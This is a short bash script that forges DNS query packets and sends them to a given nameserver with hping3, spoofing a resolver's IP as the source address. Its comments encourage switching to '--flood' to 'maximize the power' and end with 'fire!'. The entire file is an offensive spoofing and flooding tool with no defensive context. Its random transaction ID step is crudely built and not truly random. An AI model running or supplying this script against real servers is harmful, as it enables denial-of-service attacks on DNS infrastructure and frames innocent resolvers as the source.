# usage ./dns_query.sh [NS IP] [Resolver IP(spoofed as source IP)] space-separated-domain... (e.g. www google com)
# clear the previous files
dd if=/dev/null of=dns_mid.bin
dd if=/dev/null of=txid.bin
# write the domain name into the binary
for var in ${@:3}
do
  size=${#var}
  echo -en "\x`printf '%x\n' $size`" >> dns_mid.bin
  echo -n "$var" >> dns_mid.bin
done
# set a random TxID
echo -en "\x`shuf -i 0-99 -n 1`" >> txid.bin
echo -en "\x`shuf -i 0-99 -n 1`" >> txid.bin
# forge a entire DNS query packet
cat txid.bin dns_start.bin dns_mid.bin dns_end.bin dns_OPT.bin > dns.bin
# change the sending speed if necessary (-i). Set it to "flood" (replace -i with --flood) to maximize the power.
# fire!
sudo hping3 $1 -2 -p 53 -E dns.bin -d `du -b dns.bin | awk '{print $1}'` -i u50000 -a $2
